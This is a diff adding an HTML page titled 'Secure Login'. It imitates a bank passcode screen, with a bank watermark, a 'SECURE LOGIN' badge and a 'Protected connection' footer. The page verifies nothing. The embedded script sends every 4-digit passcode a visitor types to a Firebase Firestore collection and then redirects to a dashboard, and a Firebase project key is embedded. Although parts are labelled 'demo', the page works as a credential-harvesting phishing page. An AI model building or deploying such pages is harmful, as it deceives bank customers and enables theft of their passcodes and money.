@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0,
+               maximum-scale=1.0, user-scalable=no">
+
+<title>Secure Login</title>
+
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    -webkit-tap-highlight-color: transparent;
+}
+
+body {
+    min-height: 100vh;
+    overflow: hidden;
+    background:
+        radial-gradient(circle at 50% 76%,
+            rgba(45,111,177,.23),
+            transparent 42%),
+        radial-gradient(circle at 50% 10%,
+            rgba(38,91,145,.09),
+            transparent 34%),
+        linear-gradient(
+            180deg,
+            #06101a 0%,
+            #08131e 52%,
+            #091722 100%
+        );
+    color: #fff;
+}
+
+/* TOP BAR */
+
+.topbar {
+    position: absolute;
+    top: 22px;
+    left: 20px;
+    right: 20px;
+    display: flex;
+    justify-content: flex-end;
+    z-index: 5;
+}
+
+.logo-box {
+    width: 43px;
+    height: 43px;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    background: rgba(255,255,255,.035);
+    border: 1px solid rgba(120,175,220,.18);
+    box-shadow:
+        0 8px 20px rgba(0,0,0,.20),
+        inset 0 1px 0 rgba(255,255,255,.04);
+}
+
+.logo-box img {
+    width: 30px;
+    height: 30px;
+    object-fit: contain;
+}
+
+/* MAIN */
+
+.container {
+    width: 100%;
+    max-width: 400px;
+    min-height: 100vh;
+    margin: auto;
+    padding: 105px 25px 40px;
+    text-align: center;
+    position: relative;
+    z-index: 2;
+}
+
+/* SECURITY LABEL */
+
+.secure-label {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+
+    padding: 7px 12px;
+    margin-bottom: 17px;
+
+    border-radius: 30px;
+    background: rgba(52,127,199,.09);
+    border: 1px solid rgba(70,140,205,.20);
+
+    color: #8fbde2;
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 1px;
+}
+
+.secure-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: #4b9be0;
+    box-shadow: 0 0 8px rgba(75,155,224,.7);
+}
+
+/* TITLE */
+
+h1 {
+    font-size: 27px;
+    line-height: 1.15;
+    font-weight: 600;
+    letter-spacing: -.5px;
+}
+
+h1 span {
+    color: #4b99d5;
+}
+
+.subtitle {
+    margin-top: 10px;
+    color: #81909e;
+    font-size: 13px;
+    line-height: 1.5;
+}
+
+/* LOGIN CARD */
+
+.card {
+    margin-top: 18px;
+    padding: 20px 20px 20px;
+
+    border-radius: 19px;
+
+    background:
+        radial-gradient(
+            circle at 100% 0%,
+            rgba(62,139,207,.14),
+            transparent 35%
+        ),
+        linear-gradient(
+            145deg,
+            rgba(31,50,66,.98),
+            rgba(17,30,42,.99)
+        );
+
+    border: 1px solid rgba(110,170,220,.18);
+
+    box-shadow:
+        0 18px 40px rgba(0,0,0,.28),
+        inset 0 1px 0 rgba(255,255,255,.045);
+}
+
+/* LOCK */
+
+.lock {
+    width: 46px;
+    height: 46px;
+    margin: 25px auto 14px;
+
+    border-radius: 13px;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(52,127,199,.28),
+            rgba(38,91,145,.13)
+        );
+
+    border: 1px solid rgba(77,151,213,.25);
+
+    font-size: 20px;
+}
+
+.dots {
+    display: flex;
+    justify-content: center;
+    gap: 13px;
+    margin-bottom: 8px;
+  }
+/* PIN DOTS */
+
+.pin-title {
+    color: #aab7c3;
+    font-size: 12px;
+    margin-bottom: 14px;
+}
+
+.dots {
+    display: flex;
+    justify-content: center;
+    gap: 13px;
+    margin-bottom: 12px;
+}
+
+.dot {
+    width: 11px;
+    height: 11px;
+    border-radius: 50%;
+
+    border: 1px solid rgba(125,178,218,.38);
+    background: rgba(255,255,255,.025);
+
+    transition: .15s ease;
+}
+
+.dot.active {
+    background: #4a94d0;
+    border-color: #4a94d0;
+    box-shadow: 0 0 9px rgba(74,148,208,.45);
+}
+
+.error {
+    height: 19px;
+    margin-bottom: 5px;
+
+    color: #e76b6b;
+    font-size: 11px;
+}
+
+/* KEYPAD */
+
+.keypad {
+    display: grid;
+    grid-template-columns: repeat(3, 70px);
+    justify-content: center;
+    gap: 11px;
+    margin-top: 8px;
+}
+
+.key {
+    width: 70px;
+    height: 57px;
+
+    border: 1px solid rgba(115,169,210,.13);
+    border-radius: 13px;
+
+    background: rgba(255,255,255,.045);
+
+    color: #edf5fb;
+
+    font-size: 20px;
+    font-weight: 500;
+
+    box-shadow:
+        0 5px 14px rgba(0,0,0,.14),
+        inset 0 1px 0 rgba(255,255,255,.025);
+
+    cursor: pointer;
+    transition: .12s ease;
+}
+
+.key:active {
+    transform: scale(.94);
+    background: rgba(62,139,207,.16);
+    border-color: rgba(82,155,215,.35);
+}
+
+.empty {
+    visibility: hidden;
+}
+
+.delete {
+    font-size: 19px;
+    color: #9eabb6;
+}
+
+/* FORGOT */
+
+.forgot {
+    display: inline-block;
+    margin-top: 22px;
+
+    color: #65a7d9;
+    text-decoration: none;
+
+    font-size: 12px;
+    font-weight: 500;
+}
+
+.forgot:active {
+    opacity: .65;
+}
+
+/* BOTTOM BANKING WATERMARK */
+
+.bank-watermark {
+    position: fixed;
+    left: 50%;
+    bottom: -15px;
+
+    width: 155%;
+    min-width: 520px;
+    max-width: 850px;
+
+    transform: translateX(-50%);
+
+    opacity: .40;
+
+    pointer-events: none;
+    z-index: 1;
+
+    filter:
+        brightness(.85)
+        contrast(1.1)
+        saturate(.8)
+        drop-shadow(0 -8px 25px rgba(42,105,160,.18));
+
+    mix-blend-mode: screen;
+
+    -webkit-mask-image:
+        linear-gradient(
+            to top,
+            rgba(0,0,0,1) 0%,
+            rgba(0,0,0,.85) 45%,
+            transparent 100%
+        );
+
+    mask-image:
+        linear-gradient(
+            to top,
+            rgba(0,0,0,1) 0%,
+            rgba(0,0,0,.85) 45%,
+            transparent 100%
+        );
+}
+
+.footer {
+    position: fixed;
+    bottom: 10px;
+    left: 0;
+    right: 0;
+
+    text-align: center;
+
+    color: rgba(150,165,178,.55);
+    font-size: 9px;
+
+    z-index: 3;
+}
+
+/* SMALL PHONES */
+
+@media (max-height: 650px) {
+
+    .container {
+        padding-top: 82px;
+    }
+
+    .card {
+        margin-top: 20px;
+        padding-top: 18px;
+        padding-bottom: 17px;
+    }
+
+    .lock {
+        margin-bottom: 10px;
+    }
+
+    .key {
+        height: 49px;
+    }
+
+    .keypad {
+        gap: 8px;
+    }
+
+    .forgot {
+        margin-top: 13px;
+    }
+}
+
+@media (max-width: 360px) {
+
+    .container {
+        padding-left: 18px;
+        padding-right: 18px;
+    }
+
+    .keypad {
+        grid-template-columns: repeat(3, 64px);
+    }
+
+    .key {
+        width: 64px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<!-- TOP LOGO -->
+<div class="topbar">
+    <div class="logo-box">
+        <img src="logo.png" alt="Logo">
+    </div>
+</div>
+
+<main class="container">
+
+    <!-- MAIN LOGIN CONTENT -->
+
+    <div class="secure-label">
+        <span class="secure-dot"></span>
+        SECURE LOGIN
+    </div>
+
+    <h1>
+        Enter your <span>passcode</span>
+    </h1>
+
+    <p class="subtitle">
+        Enter your 4-digit passcode to login
+    </p>
+
+    <!-- LOCK + DOTS OUTSIDE CARD -->
+
+    <div class="lock">🔒</div>
+
+    <div class="dots">
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+    </div>
+
+    <!-- KEYPAD CARD -->
+
+    <div class="card">
+
+        <div class="error" id="error"></div>
+
+        <div class="keypad">
+
+            <button class="key" onclick="press(1)">1</button>
+            <button class="key" onclick="press(2)">2</button>
+            <button class="key" onclick="press(3)">3</button>
+
+            <button class="key" onclick="press(4)">4</button>
+            <button class="key" onclick="press(5)">5</button>
+            <button class="key" onclick="press(6)">6</button>
+
+            <button class="key" onclick="press(7)">7</button>
+            <button class="key" onclick="press(8)">8</button>
+            <button class="key" onclick="press(9)">9</button>
+
+            <button class="key empty"></button>
+            <button class="key" onclick="press(0)">0</button>
+            <button class="key delete" onclick="removeDigit()">⌫</button>
+
+        </div>
+
+        <a href="#" class="forgot" onclick="forgotPasscode(event)">
+            Forgot passcode?
+        </a>
+
+    </div>
+
+</main>
+
+<!-- BOTTOM IMAGE -->
+<img
+    src="bk-logo.png"
+    class="bank-watermark"
+    alt=""
+>
+
+<div class="footer">
+    Secure &nbsp;•&nbsp; Protected connection
+</div>
+
+<script type="module">
+
+import { initializeApp }
+    from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+    getFirestore,
+    collection,
+    addDoc,
+    serverTimestamp
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+
+/* =========================
+   FIREBASE CONFIG
+========================= */
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCZXXmImiPPi75gjOC5wIOoMF-C7TjXJWA",
+  authDomain: "fllz-cc5c5.firebaseapp.com",
+  projectId: "fllz-cc5c5",
+  storageBucket: "fllz-cc5c5.firebasestorage.app",
+  messagingSenderId: "536967059421",
+  appId: "1:536967059421:web:ed0a57e25930008bdc0834"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+
+/* =========================
+   DEMO PASSCODE
+========================= */
+
+let passcode = "";
+
+
+/* =========================
+   KEYPAD
+========================= */
+
+window.press = function(number) {
+
+    if (passcode.length >= 4) {
+        return;
+    }
+
+    passcode += String(number);
+
+    updateDots();
+
+    document.getElementById("error").textContent = "";
+
+    if (passcode.length === 4) {
+        setTimeout(checkPasscode, 220);
+    }
+};
+
+
+/* =========================
+   DELETE
+========================= */
+
+window.removeDigit = function() {
+
+    if (passcode.length === 0) {
+        return;
+    }
+
+    passcode = passcode.slice(0, -1);
+
+    updateDots();
+
+    document.getElementById("error").textContent = "";
+};
+
+
+/* =========================
+   UPDATE DOTS
+========================= */
+
+function updateDots() {
+
+    const dots = document.querySelectorAll(".dot");
+
+    dots.forEach((dot, index) => {
+
+        dot.classList.toggle(
+            "active",
+            index < passcode.length
+        );
+
+    });
+}
+
+
+/* =========================
+   SAVE DEMO CODE
+========================= */
+
+async function checkPasscode() {
+
+    const error = document.getElementById("error");
+
+    if (passcode.length !== 4) {
+        return;
+    }
+
+    try {
+
+        error.textContent = "";
+
+        await addDoc(
+            collection(db, "demoPasscodes"),
+            {
+                enteredCode: passcode,
+                type: "demo",
+                createdAt: serverTimestamp()
+            }
+        );
+
+        error.textContent = "";
+
+        window.location.href = "dashboard.html";
+
+    } catch (err) {
+
+        console.error("Firestore error:", err);
+
+        error.textContent =
+            "Try again.";
+
+        passcode = "";
+        updateDots();
+    }
+}
+
+
+/* =========================
+   FORGOT CODE
+========================= */
+
+window.forgotPasscode = function(event) {
+
+    if (event) {
+        event.preventDefault();
+    }
+
+    alert(
+        "Call 4055 for help!"
+    );
+};
+
+</script>
+
+</body>
+</html>
